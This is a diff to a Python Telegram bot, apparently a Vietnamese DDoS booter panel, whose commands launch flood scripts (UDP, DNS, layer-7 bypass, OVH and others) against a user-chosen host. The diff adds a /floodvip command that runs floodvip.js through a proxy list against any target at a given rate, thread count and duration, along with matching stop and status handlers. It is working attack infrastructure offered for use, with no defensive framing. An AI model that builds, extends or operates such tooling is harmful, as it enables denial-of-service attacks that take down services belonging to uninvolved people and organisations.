@@ -849,7 +849,7 @@ def stop_auto_notification():
         if auto_notification_timer:
             try:
                 auto_notification_timer.cancel()
-            except:
+            except Exception:
                 pass
             auto_notification_timer = None
 
@@ -1154,6 +1154,7 @@ def cmd_help(message):
                 "/runfjium-dns target port time [threads] - Chạy fjium-dns attack\n"
                 "/runfjium-mix target port time [threads] - Chạy fjium-mix attack\n"
                 "/runfjium-gudp target port time [threads] - Chạy fjium-gudp attack\n"
+                "/floodvip host time rate thread proxies.txt - Chạy floodvip.js\n"
                 "/stopkill - Dừng kill.js\n"
                 "/stopudp - Dừng udp_improved.py\n"
                 "/stopudpbypass - Dừng udpbypass\n"
@@ -1162,6 +1163,7 @@ def cmd_help(message):
                 "/stopfjium-dns - Dừng fjium-dns\n"
                 "/stopfjium-mix - Dừng fjium-mix\n"
                 "/stopfjium-gudp - Dừng fjium-gudp\n"
+                "/stopfloodvip - Dừng floodvip.js\n"
                 "/stopall - Dừng tất cả tác vụ của bạn\n"
                 "/stopuser <user_id> - Dừng tất cả tác vụ của user\n"
                 "/scrapeproxies - Thu thập proxies\n"
@@ -1174,6 +1176,7 @@ def cmd_help(message):
                 "/statusfjium-dns - Trạng thái fjium-dns\n"
                 "/statusfjium-mix - Trạng thái fjium-mix\n"
                 "/statusfjium-gudp - Trạng thái fjium-gudp\n"
+                "/statusfloodvip - Trạng thái floodvip.js\n"
                 "/autonotify - Quản lý thông báo tự động\n"
                 "/testudpbypass - Test lệnh udpbypass\n"
                 "/testflood - Test lệnh flood nâng cao\n"
@@ -1416,6 +1419,7 @@ def cmd_maintenance(message):
     else:
         sent = bot.reply_to(message, "❌ Không thể cập nhật maintenance mode!")
     auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+
 @bot.message_handler(commands=['myid'])
 @ignore_old_messages
 @not_banned
@@ -1529,7 +1533,7 @@ def cmd_runkill(message):
             bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runkill: {str(e)}", 
                                 chat_id=message.chat.id, 
                                 message_id=processing_msg.message_id)
-        except:
+        except Exception:
             sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runkill: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
@@ -1592,7 +1596,7 @@ def cmd_runudp(message):
             bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runudp: {str(e)}", 
                                 chat_id=message.chat.id, 
                                 message_id=processing_msg.message_id)
-        except:
+        except Exception:
             sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runudp: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
@@ -1681,7 +1685,7 @@ def cmd_runudpbypass(message):
             bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runudpbypass: {str(e)}", 
                                 chat_id=message.chat.id, 
                                 message_id=processing_msg.message_id)
-        except:
+        except Exception:
             sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runudpbypass: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
@@ -1763,7 +1767,7 @@ def cmd_runovh(message):
             bot.edit_message_text(f"❌ Có lỗi khi xử lý lệnh /runovh: {str(e)}", 
                                 chat_id=message.chat.id, 
                                 message_id=processing_msg.message_id)
-        except:
+        except Exception:
             sent = bot.reply_to(message, f"❌ Có lỗi khi xử lý lệnh /runovh: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
@@ -1958,7 +1962,7 @@ def cmd_runflood(message):
                                 chat_id=message.chat.id,
                                 message_id=processing_msg.message_id)
             auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
-        except:
+        except Exception:
             sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runflood: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
@@ -2050,7 +2054,7 @@ def cmd_runl7bypass(message):
             bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runl7bypass: {str(e)}", 
                                 chat_id=message.chat.id, 
                                 message_id=processing_msg.message_id)
-        except:
+        except Exception:
             sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runl7bypass: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
@@ -2168,7 +2172,7 @@ def cmd_runfjium_dns(message):
             bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-dns: {str(e)}",
                                 chat_id=message.chat.id,
                                 message_id=processing_msg.message_id)
-        except:
+        except Exception:
             sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-dns: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
@@ -2286,7 +2290,7 @@ def cmd_runfjium_mix(message):
             bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-mix: {str(e)}",
                                 chat_id=message.chat.id,
                                 message_id=processing_msg.message_id)
-        except:
+        except Exception:
             sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-mix: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
@@ -2404,8 +2408,128 @@ def cmd_runfjium_gudp(message):
             bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-gudp: {str(e)}",
                                 chat_id=message.chat.id,
                                 message_id=processing_msg.message_id)
-        except:
+        except Exception:
             sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-gudp: {str(e)}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+
+@bot.message_handler(commands=['floodvip'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@resource_limit
+@log_command
+def cmd_floodvip(message):
+    try:
+        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /floodvip...")
+
+        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+        delete_message_immediately(message.chat.id, message.message_id)
+
+        # Phân tích tham số từ lệnh
+        args = message.text.split()
+        if len(args) != 6:
+            bot.edit_message_text(
+                "⚠️ Cách dùng: /floodvip <host> <time> <rate> <thread> <proxies.txt>\n"
+                "Ví dụ: /floodvip example.com 60 1000 10 proxies.txt\n"
+                "📋 Tham số:\n"
+                "• host: Target URL hoặc IP\n"
+                "• time: Thời gian tấn công (giây)\n"
+                "• rate: Tốc độ tấn công\n"
+                "• thread: Số luồng\n"
+                "• proxies.txt: File chứa danh sách proxy",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+
+        host = args[1]
+        time = args[2]
+        rate = args[3]
+        thread = args[4]
+        proxies_file = args[5]
+
+        # Kiểm tra tính hợp lệ của tham số
+        try:
+            time_int = int(time)
+            rate_int = int(rate)
+            thread_int = int(thread)
+            if time_int <= 0 or time_int > 3600:
+                raise ValueError("Time phải từ 1-3600 giây")
+            if rate_int <= 0 or rate_int > 10000:
+                raise ValueError("Rate phải từ 1-10000")
+            if thread_int <= 0 or thread_int > 1000:
+                raise ValueError("Thread phải từ 1-1000")
+        except ValueError as ve:
+            bot.edit_message_text(f"❌ Tham số không hợp lệ: {ve}",
+                                chat_id=message.chat.id,
+                                message_id=processing_msg.message_id)
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+            return
+
+        # Kiểm tra file floodvip.js
+        if not os.path.isfile('floodvip.js'):
+            bot.edit_message_text(
+                "❌ File 'floodvip.js' không tồn tại!\n"
+                "📥 Vui lòng đảm bảo file floodvip.js có trong thư mục bot.",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+
+        # Kiểm tra file proxy
+        if not os.path.isfile(proxies_file):
+            bot.edit_message_text(
+                f"❌ File proxy '{proxies_file}' không tồn tại!\n"
+                "📁 Vui lòng kiểm tra tên file proxy hoặc tạo file proxy hợp lệ.",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+
+        # Cập nhật thông báo
+        bot.edit_message_text(
+            f"🚀 **Đang khởi động floodvip attack...**\n"
+            f"🎯 **Target:** `{host}`\n"
+            f"⏱️ **Time:** {time}s\n"
+            f"📊 **Rate:** {rate}\n"
+            f"🧵 **Thread:** {thread}\n"
+            f"📁 **Proxy:** {proxies_file}\n\n"
+            f"🔄 Đang khởi động tác vụ...",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id,
+            parse_mode='Markdown'
+        )
+
+        # Tạo lệnh chạy floodvip.js
+        cmd = ['node', 'floodvip.js', host, time, rate, thread, proxies_file]
+        logger.info(f"Đang chạy floodvip.js với các tham số: {cmd}")
+
+        # Tự động xóa thông báo khởi động sau 10 giây
+        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+
+        # Chạy script floodvip.js bất đồng bộ
+        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'floodvip', message)
+
+        # Log hoạt động
+        db.log_activity(
+            message.from_user.id,
+            "RUN_FLOODVIP",
+            f"host={host}, time={time}, rate={rate}, thread={thread}, proxy={proxies_file}"
+        )
+
+    except Exception as e:
+        logger.error(f"Đã xảy ra lỗi trong /floodvip: {e}")
+        try:
+            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /floodvip: {str(e)}",
+                                chat_id=message.chat.id,
+                                message_id=processing_msg.message_id)
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+        except Exception:
+            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /floodvip: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
 @bot.message_handler(commands=['stopovh'])
@@ -2530,7 +2654,7 @@ def cmd_statusovh(message):
 
 
 
-@bot.message_handler(commands=['stopkill', 'stopudp', 'stopproxies', 'stopflood', 'stopudpbypass', 'stopl7bypass', 'stopfjium-dns', 'stopfjium-mix', 'stopfjium-gudp'])
+@bot.message_handler(commands=['stopkill', 'stopudp', 'stopproxies', 'stopflood', 'stopudpbypass', 'stopl7bypass', 'stopfjium-dns', 'stopfjium-mix', 'stopfjium-gudp', 'stopfloodvip'])
 @ignore_old_messages
 @not_banned
 @admin_required
@@ -2579,6 +2703,10 @@ def cmd_stop_task(message):
             task_name = "fjium-gudp"
             task_key = "fjium-gudp"
             logger.info(f"User {user_id} requesting to stop fjium-gudp task")
+        elif cmd.startswith('/stopfloodvip'):
+            task_name = "floodvip"
+            task_key = "floodvip"
+            logger.info(f"User {user_id} requesting to stop floodvip task")
         
         # Cập nhật thông báo
         try:
@@ -2640,7 +2768,7 @@ def cmd_stop_task(message):
                 except Exception as final_error:
                     logger.error(f"Final fallback failed: {final_error}")
 
-@bot.message_handler(commands=['statuskill', 'statusudp', 'statusproxies', 'statusflood', 'statusudpbypass', 'statusl7bypass', 'statusfjium-dns', 'statusfjium-mix', 'statusfjium-gudp'])
+@bot.message_handler(commands=['statuskill', 'statusudp', 'statusproxies', 'statusflood', 'statusudpbypass', 'statusl7bypass', 'statusfjium-dns', 'statusfjium-mix', 'statusfjium-gudp', 'statusfloodvip'])
 @ignore_old_messages
 @not_banned
 @admin_required
@@ -2674,6 +2802,8 @@ def cmd_status_task(message):
             task_key = 'fjium-mix'
         elif 'fjium-gudp' in cmd:
             task_key = 'fjium-gudp'
+        elif 'floodvip' in cmd:
+            task_key = 'floodvip'
         else:
             bot.edit_message_text(
                 "❌ Lệnh không hợp lệ.",
@@ -2703,7 +2833,7 @@ def cmd_status_task(message):
             bot.edit_message_text(f"❌ Lỗi khi kiểm tra trạng thái tác vụ: {str(e)}", 
                                 chat_id=message.chat.id, 
                                 message_id=processing_msg.message_id)
-        except:
+        except Exception:
             sent = bot.reply_to(message, f"❌ Lỗi khi kiểm tra trạng thái tác vụ: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
@@ -2886,7 +3016,7 @@ def cmd_testudpbypass(message):
             bot.edit_message_text(f"❌ Có lỗi xảy ra: {str(e)}", 
                                 chat_id=message.chat.id, 
                                 message_id=processing_msg.message_id)
-        except:
+        except Exception:
             sent = bot.reply_to(message, f"❌ Có lỗi xảy ra: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
@@ -3326,7 +3456,7 @@ def cmd_autonotify(message):
             bot.edit_message_text(f"❌ Có lỗi xảy ra: {str(e)}", 
                                 chat_id=message.chat.id, 
                                 message_id=processing_msg.message_id)
-        except:
+        except Exception:
             sent = bot.reply_to(message, f"❌ Có lỗi xảy ra: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
@@ -3421,7 +3551,7 @@ def cmd_testflood(message):
                 message_id=processing_msg.message_id
             )
             auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
-        except:
+        except Exception:
             sent = bot.reply_to(message, f"❌ Lỗi khi test flood: {e}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=15)
 
@@ -3530,89 +3660,4 @@ if __name__ == '__main__':
             logger.error(f"Error during cleanup: {e}")
         sys.exit(0)
 
-# ========== MAIN EXECUTION ==========
 
-if __name__ == "__main__":
-    try:
-        # Khởi tạo bot
-        logger.info(f"🤖 Bot khởi động với token bắt đầu bằng: {Config.TOKEN[:10]}")
-
-        # Test connection
-        try:
-            bot_info = bot.get_me()
-            logger.info(f"✅ Bot connected successfully: @{bot_info.username}")
-        except Exception as e:
-            logger.error(f"❌ Invalid bot token or connection failed: {e}")
-            sys.exit(1)
-
-        # Khởi tạo resource manager
-        try:
-            resource_manager.start_monitoring()
-            logger.info("✅ Resource manager started")
-        except Exception as e:
-            logger.error(f"❌ Không thể khởi động hệ thống quản lý tài nguyên: {e}")
-            sys.exit(1)
-
-        # Khởi tạo auto notification
-        try:
-            start_auto_notification()
-            logger.info("✅ Auto notification system started")
-        except Exception as e:
-            logger.error(f"❌ Không thể khởi động hệ thống thông báo tự động: {e}")
-
-        # Bắt đầu polling
-        logger.info("🚀 Bot started successfully! Listening for messages...")
-
-        # Polling với retry mechanism
-        max_retries = 5
-        retry_count = 0
-
-        while retry_count < max_retries:
-            try:
-                bot.polling(none_stop=True, interval=1, timeout=60)
-                break  # Nếu polling thành công, thoát khỏi loop
-            except Exception as api_e:
-                retry_count += 1
-                logger.error(f"❌ Telegram API Error (attempt {retry_count}/{max_retries}): {api_e}")
-                if retry_count < max_retries:
-                    logger.info(f"🔄 Retrying in 5 seconds...")
-                    time.sleep(5)
-                else:
-                    logger.error("❌ Max retries reached. Exiting...")
-                    break
-            except KeyboardInterrupt:
-                logger.info("🛑 Bot stopped by user")
-                break
-            except Exception as e:
-                retry_count += 1
-                logger.error(f"❌ Unexpected error (attempt {retry_count}/{max_retries}): {e}")
-                if retry_count < max_retries:
-                    logger.info(f"🔄 Retrying in 10 seconds...")
-                    time.sleep(10)
-                else:
-                    logger.error("❌ Max retries reached. Exiting...")
-                    break
-
-    except KeyboardInterrupt:
-        logger.info("🛑 Bot stopped by user (Ctrl+C)")
-    except Exception as e:
-        logger.error(f"❌ Fatal error: {e}")
-    finally:
-        # Cleanup
-        try:
-            # Dừng resource manager
-            resource_manager.stop_monitoring()
-            logger.info("🔄 Resource manager stopped")
-
-            # Dừng auto notification
-            stop_auto_notification()
-            logger.info("🔔 Auto notification system stopped")
-
-            # Dừng executor
-            executor.shutdown(wait=False)
-            logger.info("🧹 Cleanup completed")
-        except Exception as e:
-            logger.error(f"Error during cleanup: {e}")
-
-        logger.info("👋 Bot shutdown complete")
-        sys.exit(0)
